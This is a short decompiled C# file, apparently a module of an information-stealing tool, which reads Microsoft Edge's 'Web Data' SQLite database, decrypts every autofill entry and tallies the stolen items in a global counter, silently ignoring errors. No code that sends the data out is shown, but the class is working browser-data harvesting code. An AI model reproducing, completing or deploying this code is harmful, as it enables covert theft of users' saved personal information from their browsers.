﻿using System;
using System.Collections.Generic;
using SHARP.Chromium;

namespace SHARP.Edge
{
	// Token: 0x02000076 RID: 118
	internal sealed class Autofill
	{
		// Token: 0x06000288 RID: 648 RVA: 0x0000FA70 File Offset: 0x0000DC70
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> list = new List<AutoFill>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					AutoFill item = default(AutoFill);
					item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					item.sValue = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
					Counting.AutoFill++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
